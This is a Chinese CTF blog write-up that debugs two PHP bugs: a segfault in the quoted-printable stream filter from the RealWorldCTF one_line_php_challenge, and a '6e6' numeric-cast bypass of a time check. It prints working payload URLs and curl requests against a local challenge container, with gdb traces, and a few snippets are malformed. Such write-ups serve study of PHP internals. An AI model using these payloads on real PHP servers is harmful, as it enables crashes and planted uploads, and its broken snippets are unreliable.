---
title: php调试分析
tags: ctf_php_debug
abbrlink: 31116
date: 2018-12-05 11:41:55
---

## 小菜，加油

## php流处理的bug

案例: realwordctf-one_line_php_challenge

参考链接: https://hackmd.io/s/rJlfZva0m#exp

ubuntu18.04 复现一直失败，payload打过去之后，即便已经造成segmentfault,上传文件依然保留不下来。我是很懵逼啊. 比赛给的dockerfile，到目前为止也没有运行成功。。。。。。。。。。。。。。。。。。

先不考虑ubuntu18.04, 直接在ubuntu16.04上调试。

payload1:

```
file(urldecode('php://filter/convert.quoted-printable-encode/resource=data:    //,%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf'));
```

本机测试payload1，一个都没有成功，那些大佬也不知道怎么搞出来的，懵逼啊，做题，估计还缺点运气。

php7.2:

```
tiandiwuji@tiandiwuji:~/Desktop$ php -v
PHP 7.2.10-0ubuntu0.18.04.1 (cli) (built: Sep 13 2018 13:45:02) ( NTS )
Copyright (c) 1997-2018 The PHP Group
Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies
    with Zend OPcache v7.2.10-0ubuntu0.18.04.1, Copyright (c) 1999-2018, by Zend Technologies
tiandiwuji@tiandiwuji:~/Desktop$ cat test.php
<?php
file(urldecode('php://filter/convert.quoted-printable-encode/resource=data:    //,%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf'));
# file(urldecode('php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA'));
?>
tiandiwuji@tiandiwuji:~/Desktop$ php test.php 
No core dump
```

php7.0:

```
qianfa@qianfa:~/Desktop/php_debug$ php -v
PHP 7.0.32-0ubuntu0.16.04.1 (cli) ( NTS )
Copyright (c) 1997-2017 The PHP Group
Zend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies
    with Zend OPcache v7.0.32-0ubuntu0.16.04.1, Copyright (c) 1999-2017, by Zend Technologies
qianfa@qianfa:~/Desktop/php_debug$ cat test.php
<?php
#file(urldecode('php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA87654321AAAAAAAAAAAAAAAAAAAAAAAA'));
file(urldecode('php://filter/convert.quoted-printable-encode/resource=data://,%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf'));
echo "No core dump";
?>
qianfa@qianfa:~/Desktop/php_debug$ php test.php 
No core dump
```

payload2:

```
php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA87654321AAAAAAAAAAAAAAAAAAAAAAAA
```

又产生了区别。嗯，起码出现和大佬一样的报错了。

php7.0: ubuntu16.04:

```
qianfa@qianfa:~/Desktop/php_debug$ php test.php

mmap() failed: [12] Cannot allocate memory

mmap() failed: [12] Cannot allocate memory
PHP Fatal error:  Out of memory (allocated 1883242496) (tried to allocate 3758096384 bytes) in /home/qianfa/Desktop/php_debug/test.php on line 2
```

php7.2.12: ubuntu16.04:

```
qianfa@qianfa:~/Desktop/php_debug$ php7 -v
PHP 7.2.12 (cli) (built: Dec  5 2018 10:56:59) ( NTS DEBUG )
Copyright (c) 1997-2018 The PHP Group
Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies
qianfa@qianfa:~/Desktop/php_debug$ php7 test.php

Fatal error: Allowed memory size of 134217728 bytes exhausted at /home/qianfa/Desktop/php_debug/php-7.2.12/ext/standard/filters.c:1601 (tried to allocate 117440512 bytes) in /home/qianfa/Desktop/php_debug/test.php on line 2
```

php7.2.10: ubuntu18.04:

```
tiandiwuji@tiandiwuji:~/Desktop$ php -v
PHP 7.2.10-0ubuntu0.18.04.1 (cli) (built: Sep 13 2018 13:45:02) ( NTS )
Copyright (c) 1997-2018 The PHP Group
Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies
    with Zend OPcache v7.2.10-0ubuntu0.18.04.1, Copyright (c) 1999-2018, by Zend Technologies
tiandiwuji@tiandiwuji:~/Desktop$ php test.php

mmap() failed: [12] Cannot allocate memory

mmap() failed: [12] Cannot allocate memory
PHP Fatal error:  Out of memory (allocated 1883242496) (tried to allocate 3758096384 bytes) in /home/tiandiwuji/Desktop/test.php on line 4

Fatal error: Out of memory (allocated 1883242496) (tried to allocate 3758096384 bytes) in /home/tiandiwuji/Desktop/test.php on line 4
```

官方环境, 如期出现500.

```
qianfa@qianfa:~/Desktop/realworldfinal/oneline$ curl-v -F "file=@flag" "http.0.0.1:8080?orange=php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA87654321AAAAAAAAAAAAAAAAAAAAAAAA"
* Rebuilt URL to: http://127.0.0.1:8080/?orange=php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA87654321AAAAAAAAAAAAAAAAAAAAAAAA
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> POST /?orange=php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA87654321AAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.47.0
> Accept: */*
> Content-Length: 208
> Expect: 100-continue
> Content-Type: multipart/form-data; boundary=------------------------d4a24c8a4605c592
> 
< HTTP/1.1 100 Continue
* HTTP 1.0, assume close after body
< HTTP/1.0 500 Internal Server Error
< Date: Wed, 05 Dec 2018 13:49:03 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Content-Length: 0
< Connection: close
< Content-Type: text/html; charset=UTF-8
< 
* Closing connection 0

```

官方环境，使用最终payload:

```
qianfa@qianfa:~/Desktop/realworldfinal/oneline$ curl -v -F "file=@flag" "http://127.0.0.1:8080?orange=php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA"
* Rebuilt URL to: http://127.0.0.1:8080/?orange=php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> POST /?orange=php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.47.0
> Accept: */*
> Content-Length: 208
> Expect: 100-continue
> Content-Type: multipart/form-data; boundary=------------------------5385e7ea169feb1a
> 
< HTTP/1.1 100 Continue
* Empty reply from server
* Connection #0 to host 127.0.0.1 left intact
curl: (52) Empty reply from server

结果:
root@a2aa31afc385:/tmp# php -v
PHP 7.2.10-0ubuntu0.18.04.1 (cli) (built: Sep 13 2018 13:45:02) ( NTS )
Copyright (c) 1997-2018 The PHP Group
Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies
    with Zend OPcache v7.2.10-0ubuntu0.18.04.1, Copyright (c) 1999-2018, by Zend Technologies
root@a2aa31afc385:/tmp# cat phpul3j1f 
flag{afsdf}
```

开始使用php7.2.12开始调试:

首先根据字符串查询文件名:

```
qianfa@qianfa:~/Desktop/php_debug/php-7.2.12$ grep "mmap() failed" -rn -A10 -B5 -l ./
./Zend/zend_language_scanner.o            # 编译之后的文件
./Zend/zend_language_scanner.c
./Zend/zend_alloc.c
./Zend/zend_language_scanner.l
./Zend/.libs/zend_language_scanner.o      # 编译之后的文件
./Zend/.libs/zend_alloc.o        # 编译之后的文件
./Zend/zend_alloc.o              # 编译之后的文件
./sapi/phpdbg/phpdbg             # 可执行文件
./sapi/fpm/php-fpm               # 可执行文件
./sapi/cli/php                   # 可执行文件
./sapi/cgi/php-cgi               # 可执行文件
./sapi/litespeed/lsapilib.c
```

zend_language_scanner.l:

```
qianfa@qianfa:~/Desktop/php_debug/php-7.2.12$ cat ./Zend/zend_language_scanner.l | grep mmap
		zend_error_noreturn(E_COMPILE_ERROR, "zend_stream_mmap() failed");
```

zend_language_scanner.c:

```
qianfa@qianfa:~/Desktop/php_debug/php-7.2.12$ cat ./Zend/zend_language_scanner.c | grep mmap
		zend_error_noreturn(E_COMPILE_ERROR, "zend_stream_mmap() failed");
```

查看lsapilib.c:

```
qianfa@qianfa:~/Desktop/php_debug/php-7.2.12/sapi/litespeed$ cat lsapilib.c | grep "mmap() failed"
        perror( "Anonymous mmap() failed" );
```

符合条件的只有: `./Zend/zend_alloc.c`:

```
qianfa@qianfa:~/Desktop/php_debug/php-7.2.12$ cat -n ./Zend/zend_alloc.c | grep "mmap() failed"
   433			fprintf(stderr, "\nmmap() failed: [%d] %s\n", errno, strerror(errno));
   476			fprintf(stderr, "\nmmap() failed: [%d] %s\n", errno, strerror(errno));
```

调试,下断点，直接结束，不知道啥情况:

```
qianfa@qianfa:~/Desktop/php_debug$ gdb -q php7
pwndbg: loaded 175 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)

Reading symbols from php7...done.
pwndbg> b /home/qianfa/Desktop/php_debug/php-7.2.12/Zend/zend_alloc.c: 476
Breakpoint 1 at 0x8d9a2b: file /home/qianfa/Desktop/php_debug/php-7.2.12/Zend/zend_alloc.c, line 476.
pwndbg> b /home/qianfa/Desktop/php_debug/php-7.2.12/Zend/zend_alloc.c: 433
Breakpoint 2 at 0x8d98f4: file /home/qianfa/Desktop/php_debug/php-7.2.12/Zend/zend_alloc.c, line 433.
pwndbg> r test.php
Starting program: /usr/bin/php7 test.php
123[Inferior 1 (process 100361) exited normally]
```

payload:

```
file(urldecode('php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA'));
```

结果如下:

```
qianfa@qianfa:~/Desktop/php_debug$ gdb -q php7
pwndbg: loaded 175 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)

Reading symbols from php7...done.
pwndbg> b /home/qianfa/Desktop/php_debug/php-7.2.12/Zend/zend_alloc.c: 433
Breakpoint 1 at 0x8d98f4: file /home/qianfa/Desktop/php_debug/php-7.2.12/Zend/zend_alloc.c, line 433.
pwndbg> b /home/qianfa/Desktop/php_debug/php-7.2.12/Zend/zend_alloc.c: 476
Breakpoint 2 at 0x8d9a2b: file /home/qianfa/Desktop/php_debug/php-7.2.12/Zend/zend_alloc.c, line 476.
pwndbg> r test.php
Starting program: /usr/bin/php7 test.php

Program received signal SIGSEGV, Segmentation fault.
__memcpy_avx_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S:244
244	../sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────[ REGISTERS ]───────────────────────────────────
 RAX  0x7ffff44629c1 ◂— 0x7ffff4462a
 RBX  0x0
 RCX  0xffffffffffffffff
 RDX  0xffffffffffffffff
 RDI  0x7ffff44629c1 ◂— 0x7ffff4462a
 RSI  0x0
 R8   0x7fffffffa060 ◂— 0x38 /* '8' */
 R9   0x0
 R10  0x9
 R11  0x7ffff70bef90 ◂— lahf   
 R12  0x4234e0 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffde70 ◂— 0x2
 R14  0x7ffff441e030 —▸ 0x7ffff4468820 —▸ 0xa04677 (execute_ex+169) ◂— call   0x97d65c
 R15  0x7ffff4468820 —▸ 0xa04677 (execute_ex+169) ◂— call   0x97d65c
 RBP  0x7fffffff9ff0 —▸ 0x7fffffffa0c0 —▸ 0x7fffffffa130 —▸ 0x7fffffffa1d0 —▸ 0x7fffffffa210 ◂— ...
 RSP  0x7fffffff9f58 —▸ 0x850874 (php_conv_qprint_encode_convert+1301) ◂— mov    rax, qword ptr [rbp - 0x68]
 RIP  0x7ffff7078164 (__memcpy_avx_unaligned+708) ◂— vmovdqu ymm4, ymmword ptr [rsi]
────────────────────────────────────[ DISASM ]─────────────────────────────────────
 ► 0x7ffff7078164 <__memcpy_avx_unaligned+708>    vmovdqu ymm4, ymmword ptr [rsi]
   0x7ffff7078168 <__memcpy_avx_unaligned+712>    vmovdqu xmm5, xmmword ptr [rsi + 
```

直接Segmentation fault。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。草泥马哦

过了一会再次调试，文章中调试肯定不是php7.2，好了。真特么玄学。

原原本本在走一遍。

```
file(urldecode('php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA87654321AAAAAAAAAAAAAAAAAAAAAAAA'));
```

第一步，执行`php_conv_convert`的时候，跳转到`php_conv_qprint_encode_convert`

![](/assets/php_debug/TIM截图20181206205905.png)

这是因为:

```
php_conv_convert定义如下:
#define php_conv_convert(a, b, c, d, e) ((php_conv *)(a))->convert_op((php_conv *)(a), (b), (c), (d), (e))

调用如下:
php_conv_convert(inst->cd, &ps, &icnt, &pd, &ocnt))

(gdb) p *inst->cd
$3 = {convert_op = 0x85035f <php_conv_qprint_encode_convert>, dtor = 0x8502ce <php_conv_qprint_encode_dtor>}
```

由于传入的参数中`ord(%bf)`大于126,所以进入如果所示分支:

![](/assets/php_debug/TIM截图20181206210427.png)

```
if (line_ccnt < 4) {
	if (ocnt < inst->lbchars_len + 1) {
		err = PHP_CONV_ERR_TOO_BIG;       ## BUG的成因
		break;
	}
    *(pd++) = '=';
    ocnt--;
    line_ccnt--;

    memcpy(pd, inst->lbchars, inst->lbchars_len);
    pd += inst->lbchars_len;
    ocnt -= inst->lbchars_len;
    line_ccnt = inst->line_len;
}
```

此时，`inst->lbchars_len =  3544952156018063160`，所以会返回`PHP_CONV_ERR_TOO_BIG`.

该数值比较有意思：

```
qianfa@qianfa:~/Desktop/php_debug$ python
Python 2.7.12 (default, Nov 12 2018, 14:36:49) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from libnum import *
>>> n2s(3544952156018063160)
'12345678'
```

和我们payload中的`12345678`一致，是否意味着`inst->lbchars_len`可控？？？？

同时，如果`ocnt < inst->lbchars_len + 1`未能通过，那么程序将执行：

`memcpy(pd, inst->lbchars, inst->lbchars_len);`,

如果`Inst->lbchars_len`可控，那么可以令`inst->lbchars_len = 0xffffffffffffffff`，那么就可以绕过`ocnt < inst->lbchars_len + 1`,执行`memcpy(pd, inst->lbchars, inst->lbchars_len);`,由于`lbchars_len`过大，那么memcpy将会出错，导致core dump？？？？？？？？？？？？？？？？？？？？？

返回`PHP_CONV_ERR_TOO_BIG`，程序来到下一步:

```
case PHP_CONV_ERR_TOO_BIG: {
	char *new_out_buf;
	size_t new_out_buf_size;

	new_out_buf_size = out_buf_size << 1;
	/*
         这里的new_out_buf_size为out_buf_size左移一位
         也就是说如果out_buf_size为一个比较小的数字，下面的if恒不成立 
        */
	if (new_out_buf_size < out_buf_size) {
        /* whoa! no bigger buckets are sold anywhere... */
        if (NULL == (new_bucket = php_stream_bucket_new(stream, out_buf, (out_buf_size - ocnt), 1, persistent))) {
            goto out_failure;
        }

        php_stream_bucket_append(buckets_out, new_bucket);

        out_buf_size = ocnt = initial_out_buf_size;
        out_buf = pemalloc(out_buf_size, persistent);
        pd = out_buf;
	} else {
        new_out_buf = perealloc(out_buf, new_out_buf_size, persistent);
        pd = new_out_buf + (pd - out_buf);
        ocnt += (new_out_buf_size - out_buf_size);
        out_buf = new_out_buf;
        out_buf_size = new_out_buf_size;
	}
} break;
```

由于返回`PHP_CONV_ERRTOO_BIG`，

正常逻辑: 所以程序认为`out_buf_size`是一个很大的值，所以对`out_buf_size`进行左移一位的操作，这样的话，去掉高位，那么`new_out_buf_size < out_buf_size`，然后, `goto out_failure`.

事实上，`out_buf_size`是一个很小的值，那么`new_out_buf_size < out_buf_size`将一直不成立。

这样，程序将进入:

```
new_out_buf = perealloc(out_buf, new_out_buf_size, persistent);
pd = new_out_buf + (pd - out_buf);
ocnt += (new_out_buf_size - out_buf_size);
out_buf = new_out_buf;
out_buf_size = new_out_buf_size;
```

`new_out_buf_size`不断翻倍，最终导致:

```
Fatal error: Allowed memory size of 134217728 bytes exhausted at /home/qianfa/Desktop/php_debug/php-7.2.12/ext/standard/filters.c:1601 (tried to allocate 117440512 bytes) in /home/qianfa/Desktop/php_debug/test.php on line 2
```

那么为什么，`inst->lbchars_len`会是`12345678`呢，查看inst初始化的过程。

![](/assets/php_debug/TIM截图20181206215110.png)

由于我们使用`php://`没有对`convert.quoted-printable-encode`附加`options`, 所以这里的`options`就是`NULL`,一直到了`else`分支, 我们可以看到他传的参数为`(php_conv_qprint_encode *)retval, 0, NULL, 0, 0, opts, persistent)`

```
if (php_conv_qprint_encode_ctor((php_conv_qprint_encode *)retval, 0, NULL, 0, 0, opts, persistent)) {
	goto out_failure;
}

static php_conv_err_t php_conv_qprint_encode_ctor(php_conv_qprint_encode *inst, unsigned int line_len, const char *lbchars, size_t lbchars_len, int lbchars_dup, int opts, int persistent){。。。。。。}
```

所以进入`php_conv_qprint_encode_ctor`,由于lbchars为NULL,所以`inst->lbchars_len`未被赋值。

![](/assets/php_debug/TIM截图20181206215505.png)

从而导致，`inst->lbchars_len`未被初始化使用，为程序控制该值的值买下隐患。由于未被初始化，加上php中的内存操作相当多，所以，该内存存在被控制的风险。

通过多次测试，可以发现，`inst->lbchars_len`的值由payload中的一部分填充。也就是上边所说的payload中的`12345678`。

最终通过整数溢出，`0xffffffffffffffff + 1 = 0 < ocnt`通过条件`ocnt < inst->lbchars_len + 1`,导致`memcpy(pd, inst->lbchars, inst->lbchars_len);`,出错。

```
php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA
```

总结，大佬们太强了，fuzz很重要。

## php类型转换的问题

案例: solveme.peng.kr winter sleep

```
<?php
   error_reporting(0);
   require __DIR__.'/lib.php';
   if(isset($_GET['time'])){
       if(!is_numeric($_GET['time'])){
           echo 'The time must be number.';
       }else if($_GET['time'] < 60 * 60 * 24 * 30 * 2){
           echo 'This time is too short.';
       }else if($_GET['time'] > 60 * 60 * 24 * 30 * 3){
           echo 'This time is too long.';
       }else{
           sleep((int)$_GET['time']);
           echo $flag;
       }
       echo '<hr>';
   }
   highlight_file(__FILE__);
```

题目很简单，需要构造一个大于5184000,但是int之后很小的数字来绕过。`6e6`即可。

测试代码：

```
<?php
echo 60 * 60 * 24 * 30 * 2;
echo "\n";
echo 6e6;
echo "\n";
echo (int)'6e6';
echo "\n";
echo 60 * 60 * 24 * 30 * 3;
```

结果:

```
qianfa@qianfa:~/Desktop/temp$ php test.php 
5184000
6000000
6
7776000
```

那么为什么会出现这个结果呢?

fuzz:

ht.php:

```
<?php
    error_reporting(0);
    session_start();
    var_dump($_GET['num']);
    var_dump($_GET['num'] - 0);
    var_dump((int)$_GET['num']);
    var_dump((float)$_GET['num']);
```

测试:

```
qianfa@qianfa:/var/www/html$ curl localhost/ht.php?num=6e6
string(3) "6e6"
float(6000000)
int(6)
float(6000000)
qianfa@qianfa:/var/www/html$ curl localhost/ht.php?num=6a6
string(3) "6a6"
int(6)
int(6)
float(6)
```

可以看到 `'6e6' - 0` 等于6000000，也就是说字符串`'6e6'`被转化成float型，并没有转为int型。使用int强制转化一个科学计数法表示的字符串，转换过程中并不能识别科学计数法，只是把**e**当做普通字符。效果和`'6a6'`一样。而`'6e6'`转化为float，变成浮点数，则可以识别科学计数法。

使用多种php版本进行测试：

test.py

```
import docker
client = docker.from_env()


php_versions = ['5.3','5.4','5.5','5.6', '7.0','7.1','7.2']
for version in(php_versions):
php = "php:"+version + "-cli"

print(php)
print("echo((int)'6e6')")
print(client.containers.run("php:"+version+"-cli", '''php -r "echo((int)'6e6');"'''))
print("echo((float)'6e6')")
print(client.containers.run("php:"+version+"-cli", '''php -r "echo((float)'6e6');"''’))
```

结果：

```
qianfa@qianfa:~/Desktop/temp$ sudo python test.py 
php:5.3-cli
echo((int)'6e6')
6
echo((float)'6e6')
6000000
php:5.4-cli
echo((int)'6e6')
6
echo((float)'6e6')
6000000
php:5.5-cli
echo((int)'6e6')
6
echo((float)'6e6')
6000000
php:5.6-cli
echo((int)'6e6')
6
echo((float)'6e6')
6000000
php:7.0-cli
echo((int)'6e6')
6
echo((float)'6e6')
6000000
php:7.1-cli
echo((int)'6e6')
6000000
echo((float)'6e6')
6000000
php:7.2-cli
echo((int)'6e6')
6000000
echo((float)'6e6')
6000000
```

可以看到在php7.0以前的版本中(int)’6e6’结果是6，但是在7.1以后的版本中，(int)’6e6’已经是6000000，符合(int)’6e6’ = (int)(float)’6e6’这个逻辑了。

gdb调试,php7.2:

```
gdb --args php7 -r "echo((int)'6e6');"
b _zval_get_long_func
```

因为使用CLion比较方便点，所以直接使用Clion了。

在`zend_operators.c中_zval_get_long_func_ex`下断点:

![](/assets/php/TIM截图20190104120339.png)

此时，type为6，也就对应着string类型。

![](/assets/php/TIM截图20190104120610.png)

因此，会调用`_is_numeric_string_ex`函数来进行转化。

![](/assets/php/TIM截图20190104120916.png)

该函数中会处理科学计数法的问题:

![](/assets/php/TIM截图20190104121258.png)

最终会调用`zend_strtod`，该函数类似于`strtod`函数。

![](/assets/php/TIM截图20190104121624.png)

strtol不能识别科学计数法，字符串6e6转成整型是6，而strtod可以识别科学计数法，6e6转成浮点数是6000000。这也就可以解释**可以看到在php7.0以前的版本中(int)’6e6’结果是6，但是在7.1以后的版本中，(int)’6e6’已经是6000000，符合(int)’6e6’ = (int)(float)’6e6’这个逻辑了。**

最终的处理逻辑是如果发现了小数点或者数字e，就采用zend_strtod来处理，这样就跟字符串转浮点数是一模一样的处理逻辑了。所以最终的结果也就符合了(int)’6e6’ = (int)(float)’6e6’这个逻辑。

7.2版中使用了新的函数is_numeric_string替代strtoll。注释中说明使用新函数是为了避免strtoll的溢出问题，自己实现了is_number_string函数来替代strtoll。

```
/* Previously we used strtol here, not is_numeric_string,
* and strtol gives you LONG_MAX/_MIN on overflow.
* We use use saturating conversion to emulate strtol()'s
* behaviour.
*/
```

## 文件上传的问题

案例: 0CTF2018之ezDoor的全盘非预期解法

* http://pupiles.com/%E7%94%B1%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83.html

* https://blog.zsxsoft.com/post/36

## 参考链接

* https://hackmd.io/s/rJlfZva0m#exp
* https://paper.seebug.org/566/#solvemepengkr-winter-sleep

